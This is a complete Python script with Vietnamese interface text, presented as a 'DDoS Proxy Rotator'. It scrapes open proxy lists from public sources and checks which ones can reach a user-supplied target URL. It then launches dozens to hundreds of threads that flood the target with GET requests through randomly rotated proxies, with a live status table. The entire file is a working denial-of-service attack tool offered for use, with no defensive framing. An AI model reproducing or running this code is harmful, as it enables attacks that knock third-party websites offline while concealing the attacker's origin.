import os
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import signal
import sys

from rich.console import Console
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn
from rich.live import Live
from rich.panel import Panel
from rich.text import Text
import requests

console = Console()

# ASCII Art mẫu
ascii_art = """
[bold blue]
                               
   ███╗░░██╗░█████╗░██╗░░░██╗░█████╗░
   ████╗░██║██╔══██╗██║░░░██║██╔══██╗
   ██╔██╗██║██║░░██║╚██╗░██╔╝███████║
   ██║╚████║██║░░██║░╚████╔╝░██╔══██║
   ██║░╚███║╚█████╔╝░░╚██╔╝░░██║░░██║
   ╚═╝░░╚══╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝                 
[/bold blue]
[cyan]Tool: DDoS Proxy Rotator with Rich UI[/cyan]
"""

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-proxy/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/hookzofsocks/qQMGR/master/http.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/http.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt"
]

active_proxies = []
target_url = ""
error_count = {}
MAX_ERRORS = 3

# Số luồng mặc định 
proxy_threads = 50
ddos_threads = 100

# Biến điều khiển vòng lặp
running = True

def fetch_proxies():
    proxies = set()
    with console.status("[cyan] Đang tải danh sách proxy..."):
        for url in PROXY_SOURCES:
            try:
                res = requests.get(url, timeout=10)
                for line in res.text.splitlines():
                    if ':' in line:
                        proxies.add(line.strip())
            except Exception as e:
                console.print(f"[yellow]Lỗi tải từ {url}: {e}[/]")
                continue
    return list(proxies)

def test_proxy(proxy):
    global target_url
    try:
        session = requests.Session()
        session.proxies = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}' 
        }
        session.get(target_url, timeout=15)
        return True, proxy
    except:
        return False, proxy

def scan_proxies_with_progress(threads):
    global active_proxies
    proxy_list = fetch_proxies()
    total = len(proxy_list)
    success = 0
    failed = 0

    active_proxies.clear()

    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        transient=False,
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Kiểm tra chất lượng proxy...", total=total)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(test_proxy, proxy): proxy for proxy in proxy_list}
            for future in futures:
                result, proxy = future.result()
                if result:
                    active_proxies.append(proxy)
                    success += 1
                else:
                    failed += 1
                progress.update(task, advance=1)

    console.print(f"[green]✅ Thành công: {success}[/]")
    console.print(f"[red]❌ Thất bại: {failed}[/]")
    return len(active_proxies)

def attack_with_proxy(proxy):
    global target_url, error_count
    headers = {
        'User-Agent': 'Mozilla/5.0'
    }
    try:
        response = requests.get(target_url, headers=headers, proxies={"http": f"http://{proxy}", "https": f"https://{proxy}"},  timeout=10)
        if response.status_code in [200, 403, 429]:
            return True
        else:
            return False
    except:
        error_count[proxy] = error_count.get(proxy, 0) + 1
        if error_count[proxy] >= MAX_ERRORS and proxy in active_proxies:
            active_proxies.remove(proxy)
        return False

def ddos_attack_loop():
    global running
    while running:
        if not active_proxies:
            console.print("[bold red] Không còn proxy khả dụng! Quét lại...")
            scan_proxies_with_progress(proxy_threads)
            if not active_proxies:
                console.print("[bold yellow] Vẫn chưa tìm thấy proxy nào khả dụng!")
                time.sleep(5)
                continue
        proxy = random.choice(active_proxies)
        try:
            attack_with_proxy(proxy)
        except Exception:
            pass

def show_menu():
    console.clear()
    console.print(Panel(Text.from_markup(ascii_art), border_style="blue"))
    console.print("[bold cyan][1][/bold cyan] Nhập URL & quét proxy")
    console.print("[bold cyan][2][/bold cyan] Bắt đầu tấn công DDoS")
    console.print("[bold cyan][3][/bold cyan] Thay đổi số luồng")
    console.print("[bold cyan][4][/bold cyan] Thoát")

def change_threads():
    global proxy_threads, ddos_threads
    console.print("[bold cyan]Nhập số luồng quét proxy:")
    proxy_input = input("Luồng quét proxy: ").strip()
    try:
        proxy_threads = int(proxy_input)
    except:
        console.print("[red]Giá trị không hợp lệ, giữ nguyên giá trị cũ.[/red]")

    console.print("[bold cyan]Nhập số luồng DDoS:")
    ddos_input = input("Luồng DDoS: ").strip()
    try:
        ddos_threads = int(ddos_input)
    except:
        console.print("[red]Giá trị không hợp lệ, giữ nguyên giá trị cũ.[/red]")

def signal_handler(sig, frame):
    global running
    running = False
    console.print("\n[yellow]Đang dừng tất cả các luồng...[/yellow]")
    time.sleep(1)
    console.print("[green]✅ Dừng thành công![/green]")
    sys.exit(0)

def main():
    global target_url, active_proxies, ddos_threads, running

    # Đăng ký tín hiệu Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    while running:
        show_menu()
        choice = input("Chọn chức năng (1/2/3/4): ").strip()

        if choice == "1":
            console.print("[bold cyan]Nhập URL mục tiêu:")
            target_url = input("URL: ").strip()
            if not target_url.startswith("http"):
                target_url = "http://" + target_url

            proxy_count = scan_proxies_with_progress(proxy_threads)
            console.print(f"[green]✅ Tìm được {len(active_proxies)} proxy hoạt động![/]")

        elif choice == "2":
            if not target_url or not active_proxies:
                console.print("[bold red]Vui lòng nhập URL và quét proxy trước![/]")
                time.sleep(2)
                continue

            threads = []
            for _ in range(ddos_threads):
                t = threading.Thread(target=ddos_attack_loop, daemon=True)
                t.start()
                threads.append(t)

            # Bảng trạng thái live
            with Live(Table(title="📊 Trạng thái tấn công"), refresh_per_second=1) as live:
                while running:
                    table = Table()
                    table.add_column("Target", justify="center")
                    table.add_column("[green]Thành công", justify="center")
                    table.add_column("[red]Lỗi", justify="center")
                    table.add_column("[yellow]Tổng", justify="center")

                    success = 0
                    failed = sum(error_count.values())
                    total = len(active_proxies)
                    table.add_row(target_url, str(success), str(failed), str(total))
                    live.update(table)
                    time.sleep(1)

        elif choice == "3":
            change_threads()
            console.print(f"[green]✅ Cập nhật thành công: Luồng quét proxy={proxy_threads}, Luồng DDoS={ddos_threads}[/green]")
            time.sleep(2)

        elif choice == "4":
            running = False
            console.print("[bold green]Đã thoát chương trình.[/]")
            break
        else:
            console.print("[bold red]Lựa chọn không hợp lệ![/]")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        signal_handler(None, None)